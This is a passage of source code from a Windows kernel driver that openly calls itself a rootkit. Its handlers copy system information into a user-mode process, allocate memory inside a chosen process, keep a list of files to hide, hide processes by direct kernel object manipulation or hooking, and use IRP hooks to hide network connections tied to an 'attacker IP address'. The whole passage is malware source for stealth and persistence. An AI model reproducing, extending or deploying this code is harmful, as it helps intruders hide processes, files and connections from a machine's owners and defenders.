		return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_MEMALLOC, STATUS_UNSUCCESSFUL, RootkInst);
	}


	// Iterate through the system info requests to copy all the information into one local buffer:
	for (ULONG64 AttrOffs = 0; AttrOffs < TotalRequests * sizeof(CurrInf); AttrOffs += sizeof(CurrInf)) {
		Status = UserToKernelMEM(Process, (PVOID)((ULONG64)RootkInst->Buffer + AttrOffs), &CurrInf, sizeof(CurrInf), FALSE);
		if (!NT_SUCCESS(Status)) {
			DbgPrintEx(0, 0, "KMDFdriver Requests - Get system information request %llu failed (cannot get request results information into local KM space)\n", AttrOffs / sizeof(CurrInf));
		}
		else {
			if (CurrInf.PoolBuffer == NULL || CurrInf.InfoSize == 0) {
				DbgPrintEx(0, 0, "KMDFdriver Requests - Get system information request %llu failed (actual request failed - InfoSize = 0, PoolBuffer = NULL)\n", AttrOffs / sizeof(CurrInf));
			}
			else {
				DbgPrintEx(0, 0, "KMDFdriver Requests - Get system information request %llu succeeded when requesting earlier and copied results\n", AttrOffs / sizeof(CurrInf));
				RtlCopyMemory((PVOID)((ULONG64)LocalSysinf + InfoOffs), CurrInf.PoolBuffer, CurrInf.InfoSize);
				InfoOffs += CurrInf.InfoSize;
			}
		}
	}


	// Copy the system information from local KM buffer into a UM buffer:
	Status = KernelToUserMEM(Process, LocalSysinf, PrcInf, InfoSize, FALSE);
	ExFreePool(LocalSysinf);

	if (!NT_SUCCESS(Status)) {
		DbgPrintEx(0, 0, "KMDFdriver Requests - Get system information failed (failed to copy actual information buffer into medium process)\n");
		return requests_helpers::ExitRootkitRequestADD(NULL, Process, ROOTKSTATUS_COPYFAIL, STATUS_SUCCESS, RootkInst);
	}
	DbgPrintEx(0, 0, "KMDFdriver Requests - Get system information succeeded\n");
	RootkInst->Out = PrcInf;
	RootkInst->Size = InfoSize;
	return requests_helpers::ExitRootkitRequestADD(NULL, Process, ROOTKSTATUS_SUCCESS, STATUS_SUCCESS, RootkInst);
}




NTSTATUS AllocSpecificMemoryRK(ROOTKIT_MEMORY* RootkInst) {
	DbgPrintEx(0, 0, "KMDFdriver Requests - Allocate memory in process\n");
	PEPROCESS Process = { 0 };
	KAPC_STATE PrcState = { 0 };
	MEMORY_BASIC_INFORMATION MemoryBasic = { 0 };
	PVOID InitialAddress = RootkInst->Buffer;
	ULONG64 RequestedSize = RootkInst->Size;
	ULONG_PTR ZeroBits = (ULONG_PTR)RootkInst->Reserved;
	SIZE_T AllocSize = ((RequestedSize / PAGE_SIZE) + 1) * PAGE_SIZE;


	// Check for invalid arguments:
	if (InitialAddress == NULL || RequestedSize == NULL) {
		DbgPrintEx(0, 0, "KMDFdriver Requests - Allocate memory in process failed (one or more invalid parameters: %p, %zu)\n", InitialAddress, RequestedSize);
		return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_ADRBUFSIZE, STATUS_UNSUCCESSFUL, RootkInst);
	}


	// Process EPROCESS:
	if (!NT_SUCCESS(PsLookupProcessByProcessId((HANDLE)RootkInst->MainPID, &Process))) {
		DbgPrintEx(0, 0, "KMDFdriver Requests - Allocate memory in process failed (cannot get EPROCESS of process %llu)\n", RootkInst->MainPID);
		return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_PROCHANDLE, STATUS_UNSUCCESSFUL, RootkInst);
	}


	// Allocate the needed memory:
	KeStackAttachProcess(Process, &PrcState);
	RootkInst->Out = memory_helpers::AllocateMemoryADD(InitialAddress, AllocSize, &PrcState, ZeroBits);
	if (RootkInst->Out == NULL) {
		DbgPrintEx(0, 0, "KMDFdriver Requests - Allocate memory in process failed (actual allocation of memory failed)\n");
		return requests_helpers::ExitRootkitRequestADD(NULL, Process, ROOTKSTATUS_MEMALLOC, STATUS_UNSUCCESSFUL, RootkInst);
	}
	DbgPrintEx(0, 0, "KMDFdriver Requests - Allocate memory in process succeeded (memory base alligned from %p to %p)\n", RootkInst->Out, InitialAddress);
	return requests_helpers::ExitRootkitRequestADD(NULL, Process, ROOTKSTATUS_SUCCESS, STATUS_SUCCESS, RootkInst);
}




NTSTATUS HideFileObjectRK(ROOTKIT_MEMORY* RootkInst) {
	DbgPrintEx(0, 0, "KMDFdriver Requests - Hide file object\n");
	PEPROCESS Process = { 0 };
	KAPC_STATE PrcState = { 0 };
	NTSTATUS Status = STATUS_UNSUCCESSFUL;
	PVOID ListOutput = NULL;
	ULONG64 ListSize = 0;


	// Check for invalid arguments:
	if ((ULONG64)RootkInst->Reserved == SHOW_HIDDEN || (ULONG64)RootkInst->Reserved == HIDE_FILE) {
		if ((RootkInst->Out == NULL && (ULONG64)RootkInst->Reserved == HIDE_FILE) || RootkInst->Buffer == NULL || (RootkInst->MedPID == 0 && RootkInst->MainPID == 0) || RootkInst->Size == 0) {
			DbgPrintEx(0, 0, "KMDFdriver Requests - Hide file object failed (one or more invalid parameters: %p, %p, %llu, %llu, %llu)\n", RootkInst->Out, RootkInst->Buffer, RootkInst->MedPID, RootkInst->MainPID, RootkInst->Size);
			return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_ADRBUFSIZE, STATUS_UNSUCCESSFUL, RootkInst);
		}
	}


	// Process EPROCESS:
	if ((ULONG64)RootkInst->Reserved == SHOW_HIDDEN || (ULONG64)RootkInst->Reserved == HIDE_FILE) {
		if (RootkInst->MainPID != 0) {
			if (!NT_SUCCESS(PsLookupProcessByProcessId((HANDLE)RootkInst->MainPID, &Process))) {
				DbgPrintEx(0, 0, "KMDFdriver Requests - Hide file object failed (cannot get EPROCESS of process %llu, main)\n", RootkInst->MainPID);
				return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_PROCHANDLE, STATUS_UNSUCCESSFUL, RootkInst);
			}
		}
		else {
			if (!NT_SUCCESS(PsLookupProcessByProcessId((HANDLE)RootkInst->MedPID, &Process))) {
				DbgPrintEx(0, 0, "KMDFdriver Requests - Hide file object failed (cannot get EPROCESS of process %llu, medium specific)\n", RootkInst->MedPID);
				return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_PROCHANDLE, STATUS_UNSUCCESSFUL, RootkInst);
			}
		}
	}


	// Get the widecharacter string from medium to the local KM buffer:
	switch ((ULONG64)RootkInst->Reserved) {
	case HIDE_FILE:
		// Add file to hiding files:
		Status = UserToKernelMEM(Process, RootkInst->Buffer, RootkInst->Out, RootkInst->Size, FALSE);
		if (!NT_SUCCESS(Status)) {
			DbgPrintEx(0, 0, "KMDFdriver Requests - Hide file object failed (UserToKernelMEM() of string failed: %p, %p, %zu)\n", RootkInst->Buffer, RootkInst->Out, RootkInst->Size);
			return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_OTHER, STATUS_UNSUCCESSFUL, RootkInst);
		}
		return HIDE_TEMPSUC;
	case SHOW_HIDDEN:
		// Return buffer of hidden files to show to attacker:
		ListOutput = RootkInst->Out;
		ListSize = RootkInst->Size;
		KeStackAttachProcess(Process, &PrcState);
		ListOutput = memory_helpers::AllocateMemoryADD(ListOutput, ListSize, &PrcState, 0);
		if (ListOutput == NULL) {
			DbgPrintEx(0, 0, "KMDFdriver Requests - Hide file object failed (Allocation of memory for list in medium failed: %p, %llu)\n", ListOutput, ListSize);
			return requests_helpers::ExitRootkitRequestADD(NULL, Process, ROOTKSTATUS_MEMALLOC, STATUS_UNSUCCESSFUL, RootkInst);
		}
		RootkInst->Out = ListOutput;
		RootkInst->Size = ListSize;
		Status = KernelToUserMEM(Process, RootkInst->Buffer, RootkInst->Out, RootkInst->Size, FALSE);
		if (!NT_SUCCESS(Status)) {
			DbgPrintEx(0, 0, "KMDFdriver Requests - Hide file object failed (KernelToUserMEM() of string failed: %p, %p, %zu)\n", RootkInst->Out, RootkInst->Buffer, RootkInst->Size);
			return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_OTHER, STATUS_UNSUCCESSFUL, RootkInst);
		}
		return SHOWHIDDEN_TEMPSUC;
	default:
		// Remove file/folder from hide list - no middle operation to do:
		return UNHIDE_TEMPSUC;
	}
}




NTSTATUS HideProcessRK(ROOTKIT_MEMORY* RootkInst) {
	DbgPrintEx(0, 0, "KMDFdriver Requests - Hide process via DKOM (process with PID = %llu, index = %llu)\n", RootkInst->MainPID, RootkInst->SemiPID);
	NTSTATUS Status = STATUS_UNSUCCESSFUL;
	PEPROCESS MediumProcess = { 0 };
	KAPC_STATE MediumState = { 0 };
	PVOID TempOutput = NULL;
	PVOID HiddenInput = NULL;
	ULONG64 TempSize = 0;
	ULONG64 ProcessManType = (ULONG64)RootkInst->Reserved;


	// Check for invalid arguments:
	if ((RootkInst->MainPID == 0 && ProcessManType != ListHiddenProcesses) ||
		!(ProcessManType == HideProcess || ProcessManType == UnhideProcess || ProcessManType == ListHiddenProcesses) ||
		(ProcessManType == ListHiddenProcesses && RootkInst->MedPID == 0) ||
		(ProcessManType == ListHiddenProcesses && RootkInst->Out == NULL)) {
		DbgPrintEx(0, 0, "KMDFdriver Requests - Hide process via DKOM/hook failed (invalid PID: %llu, %llu, %llu / invalid request number: %llu / invalid output buffer: %p)\n", RootkInst->MainPID, RootkInst->SemiPID, RootkInst->MedPID, ProcessManType, RootkInst->Out);
		return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_ADRBUFSIZE, STATUS_UNSUCCESSFUL, RootkInst);
	}


	// Pass PID of process to DKOM function:
	if (ProcessManType == HideProcess) {
		if (IS_DKOM) {
			Status = process::DKHideProcess(RootkInst->MainPID, TRUE);
		}
		else {
			Status = process::SIHideProcess(RootkInst->MainPID);
		}
		if (Status == STATUS_NOT_FOUND) {
			DbgPrintEx(0, 0, "KMDFdriver Requests - Hide process via DKOM/hook failed (did not find process with PID of %llu)\n", RootkInst->MainPID);
			return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_OTHER, STATUS_NOT_FOUND, RootkInst);
		}
		else if (!NT_SUCCESS(Status)) {
			DbgPrintEx(0, 0, "KMDFdriver Requests - Hide process via DKOM/hook failed (hiding function with PID of %llu failed with status 0x%x)\n", RootkInst->MainPID, Status);
			return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_OTHER, Status, RootkInst);
		}
		DbgPrintEx(0, 0, "KMDFdriver Requests - Hide process via DKOM/hook succeeded, hidden process with PID of %llu\n", RootkInst->MainPID);
	}
	else if (ProcessManType == UnhideProcess) {
		if (IS_DKOM) {
			Status = process::DKUnhideProcess(RootkInst->MainPID, (ULONG)RootkInst->SemiPID);  // Remove via index/PID
			if (Status == STATUS_NOT_FOUND) {
				DbgPrintEx(0, 0, "KMDFdriver Requests - Unhide process via DKOM failed (did not find process at index %llu)\n", RootkInst->SemiPID);
				return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_OTHER, STATUS_NOT_FOUND, RootkInst);
			}
		}
		else {
			Status = process::SIUnhideProcess(&RootkInst->MainPID, (ULONG*)(&RootkInst->SemiPID));  // Remove via index/PID
		}
		if (!NT_SUCCESS(Status)) {
			DbgPrintEx(0, 0, "KMDFdriver Requests - Unhide process via DKOM/hook failed (unhiding function with PID of %llu / index of %llu failed with status 0x%x)\n", RootkInst->MainPID, RootkInst->SemiPID, Status);
			return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_OTHER, Status, RootkInst);
		}
		DbgPrintEx(0, 0, "KMDFdriver Requests - Unhide process via DKOM/hook succeeded, unhidden process with PID %llu / index %llu\n", RootkInst->MainPID, RootkInst->SemiPID);
	}
	else {
		if (!NT_SUCCESS(PsLookupProcessByProcessId((HANDLE)RootkInst->MedPID, &MediumProcess))) {
			DbgPrintEx(0, 0, "KMDFdriver Requests - List hidden processes via DKOM/hook failed (cannot get EPROCESS of medium process with PID of %llu)\n", RootkInst->MedPID);
			return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_PROCHANDLE, STATUS_UNSUCCESSFUL, RootkInst);
		}
		if (IS_DKOM) {
			if (!NT_SUCCESS(process::DKListHiddenProcesses(&TempSize, &HiddenInput))) {
				DbgPrintEx(0, 0, "KMDFdriver Requests - List hidden processes via DKOM failed (Error in ListHiddenProcesses())\n");
				if (HiddenInput != NULL) {
					ExFreePool(HiddenInput);
				}
				return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_OTHER, STATUS_UNSUCCESSFUL, RootkInst);
			}
		}
		else {
			if (!NT_SUCCESS(process::SIListHiddenProcesses(&TempSize, &HiddenInput))) {
				DbgPrintEx(0, 0, "KMDFdriver Requests - List hidden processes via hooking failed (Error in ListHiddenProcesses())\n");
				if (HiddenInput != NULL) {
					ExFreePool(HiddenInput);
				}
				return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_OTHER, STATUS_UNSUCCESSFUL, RootkInst);
			}
		}
		if (TempSize == 0) {
			DbgPrintEx(0, 0, "KMDFdriver Requests - List hidden processes via DKOM/hook failed (Empty list, ListSize = 0)\n");
			if (HiddenInput != NULL) {
				ExFreePool(HiddenInput);
			}
			return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_OTHER, STATUS_UNSUCCESSFUL, RootkInst);
		}
		TempOutput = RootkInst->Out;
		KeStackAttachProcess(MediumProcess, &MediumState);
		TempOutput = memory_helpers::AllocateMemoryADD(TempOutput, TempSize, &MediumState, 0);
		if (TempOutput == NULL) {
			DbgPrintEx(0, 0, "KMDFdriver Requests - List hidden processes via DKOM failed (Allocation of memory for list in medium failed: %p, %llu)\n", TempOutput, TempSize);
			if (HiddenInput != NULL) {
				ExFreePool(HiddenInput);
			}
			return requests_helpers::ExitRootkitRequestADD(NULL, MediumProcess, ROOTKSTATUS_MEMALLOC, STATUS_UNSUCCESSFUL, RootkInst);
		}
		RootkInst->Out = TempOutput;
		RootkInst->Size = TempSize;
		Status = KernelToUserMEM(MediumProcess, HiddenInput, RootkInst->Out, RootkInst->Size, FALSE);
		if (!NT_SUCCESS(Status)) {
			DbgPrintEx(0, 0, "KMDFdriver Requests - List hidden processes via DKOM failed (KernelToUserMEM() of list failed: %p, %p, %zu)\n", RootkInst->Out, RootkInst->Buffer, RootkInst->Size);
			if (HiddenInput != NULL) {
				ExFreePool(HiddenInput);
			}
			return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_OTHER, STATUS_UNSUCCESSFUL, RootkInst);
		}
		if (HiddenInput != NULL) {
			ExFreePool(HiddenInput);
		}
		DbgPrintEx(0, 0, "KMDFdriver Requests - List hidden processes via DKOM/hook succeeded\n");
	}
	return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_SUCCESS, STATUS_SUCCESS, RootkInst);
}


NTSTATUS HideNetworkConnectionRK(ROOTKIT_MEMORY* RootkInst) {
	DbgPrintEx(0, 0, "KMDFdriver Requests - Hide networking connections via IRP hook (IP address number = %lu, index = %hu)\n", (ULONG)RootkInst->Buffer, (USHORT)RootkInst->Reserved);
	NTSTATUS Status = STATUS_UNSUCCESSFUL;
	PEPROCESS MediumProcess = { 0 };
	KAPC_STATE MediumState = { 0 };
	PVOID TempOutput = NULL;
	PVOID HiddenInput = NULL;
	ULONG64 TempSize = 0;
	ULONG64 PortManType = RootkInst->Size;
	WCHAR AttackerAddress[MAX_PATH] = { 0 };
	WCHAR CurrentAddress[MAX_PATH] = { 0 };
	UNICODE_STRING AttackerAddressUnicode = { 0 };
	UNICODE_STRING CurrentAddressUnicode = { 0 };
	ULONG CurrentAddressValue = 0;


	// If attacker IP address is not the same as currrent update it:
	if ((ULONG)RootkInst->SemiPID != AttackerAddressValue && (ULONG)RootkInst->SemiPID != 0) {
		AttackerAddressValue = (ULONG)RootkInst->SemiPID;
		if (general_helpers::CalculateAddressString(AttackerAddress, AttackerAddressValue)) {
			AttackerAddressUnicode.Buffer = AttackerAddress;
			AttackerAddressUnicode.Length = (USHORT)wcslen(AttackerAddress) * sizeof(WCHAR);
			AttackerAddressUnicode.MaximumLength = (USHORT)(wcslen(AttackerAddress) + 1) * sizeof(WCHAR);
			DbgPrintEx(0, 0,
				"KMDFdriver Requests - Received new attacker IP address to hide: %lu, %wZ\n",
				(ULONG)RootkInst->SemiPID, &AttackerAddressUnicode);
		}
		else {
			DbgPrintEx(0, 0,
				"KMDFdriver Requests - Received new attacker IP address to hide: %lu, unresolved\n",
				(ULONG)RootkInst->SemiPID);
		}
	}


	// Check for invalid arguments:
	if (((ULONG)RootkInst->Buffer == REMOVE_BY_INDEX_ADDR && (USHORT)RootkInst->Reserved == 0 && PortManType != ListHiddenAddresses) ||
		!(PortManType == HideAddress || PortManType == UnhideAddress || PortManType == ListHiddenAddresses) ||
		(PortManType == HideAddress && (ULONG)RootkInst->Buffer == REMOVE_BY_INDEX_ADDR) ||
		(PortManType == ListHiddenAddresses && RootkInst->MedPID == 0) ||
		(PortManType == ListHiddenAddresses && RootkInst->Out == NULL)) {
		DbgPrintEx(0, 0, "KMDFdriver Requests - Hide networking connections via IRP hook failed (invalid port: %hu / invalid index %hu / invalid medium PID %hu / invalid request number: %llu / invalid output buffer: %p)\n", (USHORT)RootkInst->Buffer, (USHORT)RootkInst->Reserved, (USHORT)RootkInst->MedPID, PortManType, RootkInst->Out);
		return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_ADRBUFSIZE, STATUS_UNSUCCESSFUL, RootkInst);
	}


	// Handle the different requests:
	if (PortManType != ListHiddenAddresses) {
		CurrentAddressValue = (ULONG)RootkInst->Buffer;
		if (CurrentAddressValue != 0 && 
			general_helpers::CalculateAddressString(CurrentAddress, CurrentAddressValue)) {
			CurrentAddressUnicode.Buffer = CurrentAddress;
			CurrentAddressUnicode.Length = (USHORT)wcslen(CurrentAddress) * sizeof(WCHAR);
			CurrentAddressUnicode.MaximumLength = (USHORT)(wcslen(CurrentAddress) + 1) * sizeof(WCHAR);
			DbgPrintEx(0, 0,
				"KMDFdriver Requests - Received new IP address to hide: %lu, %wZ\n",
				CurrentAddressValue, &CurrentAddressUnicode);
		}
		else {
			DbgPrintEx(0, 0,
				"KMDFdriver Requests - Received new IP address to hide: %lu, unresolved\n",
				CurrentAddressValue);
		}
	}
	if (PortManType == HideAddress) {

		// Pass IP address value to hide in case its not already in the list:
		if (irphooking::address_list::CheckIfInAddressList(CurrentAddressValue, NULL)) {
			DbgPrintEx(0, 0, "KMDFdriver Requests - Hide networking connections via IRP hook, IP address %lu is already hidden\n",
				CurrentAddressValue);
			return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_SUCCESS, STATUS_SUCCESS, RootkInst);
		}
		Status = irphooking::address_list::AddToAddressList(CurrentAddressValue);
		if (!NT_SUCCESS(Status)) {
			DbgPrintEx(0, 0, "KMDFdriver Requests - Hide networking connections via IRP hook failed (hiding function with address of %lu failed with status 0x%x)\n",
				CurrentAddressValue, Status);
			return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_OTHER, Status, RootkInst);
		}
		DbgPrintEx(0, 0, "KMDFdriver Requests - Hide networking connections via IRP hook succeeded, hidden process with address of %lu\n",
			CurrentAddressValue);
	}
	else if (PortManType == UnhideAddress) {

		// Pass the index and IP address value arguments and return the result:
		Status = irphooking::address_list::RemoveFromAddressList(CurrentAddressValue, (USHORT)RootkInst->Reserved);  // Remove via index/IP address value
		if (!NT_SUCCESS(Status)) {
			DbgPrintEx(0, 0, "KMDFdriver Requests - Unhide hidden networking connections via IRP hook failed (unhiding function with IP address value of %lu / index of %hu failed with status 0x%x)\n", CurrentAddressValue, (USHORT)RootkInst->Reserved, Status);
			return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_OTHER, Status, RootkInst);
		}
		DbgPrintEx(0, 0, "KMDFdriver Requests - Unhide hidden networking connections via IRP hook succeeded, unhidden port %hu, index %hu\n", CurrentAddressValue, (USHORT)RootkInst->Reserved);
	}
	else {

		// List hidden ports - attach to medium, allocate memory for list and return list:
		if (!NT_SUCCESS(PsLookupProcessByProcessId((HANDLE)RootkInst->MedPID, &MediumProcess))) {
			DbgPrintEx(0, 0, "KMDFdriver Requests - List hidden networking connections failed (cannot get EPROCESS of medium process with PID of %llu)\n", RootkInst->MedPID);
			return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_PROCHANDLE, STATUS_UNSUCCESSFUL, RootkInst);
		}
		if (!NT_SUCCESS(irphooking::address_list::ReturnAddressList(&HiddenInput, &TempSize))) {
			DbgPrintEx(0, 0, "KMDFdriver Requests - List hidden networking connections, hidden port list is empty!\n");
			return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_SUCCESS, STATUS_SUCCESS, RootkInst);
		}
		TempOutput = RootkInst->Out;
		KeStackAttachProcess(MediumProcess, &MediumState);
		TempOutput = memory_helpers::AllocateMemoryADD(TempOutput, TempSize, &MediumState, 0);
		if (TempOutput == NULL) {
			DbgPrintEx(0, 0, "KMDFdriver Requests - List hidden networking connections failed (Allocation of memory for list in medium failed: %p, %llu)\n", TempOutput, TempSize);
			return requests_helpers::ExitRootkitRequestADD(NULL, MediumProcess, ROOTKSTATUS_MEMALLOC, STATUS_UNSUCCESSFUL, RootkInst);
		}
		RootkInst->Out = TempOutput;
		RootkInst->Size = TempSize;
		Status = KernelToUserMEM(MediumProcess, HiddenInput, RootkInst->Out, RootkInst->Size, FALSE);
		if (!NT_SUCCESS(Status)) {
			DbgPrintEx(0, 0, "KMDFdriver Requests - List hidden networking connections failed (KernelToUserMEM() of list failed: %p, %p, %zu)\n", RootkInst->Out, RootkInst->Buffer, RootkInst->Size);
			return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_OTHER, STATUS_UNSUCCESSFUL, RootkInst);
		}
		DbgPrintEx(0, 0, "KMDFdriver Requests - List hidden networking connections succeeded\n");
	}
	return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_SUCCESS, STATUS_SUCCESS, RootkInst);
}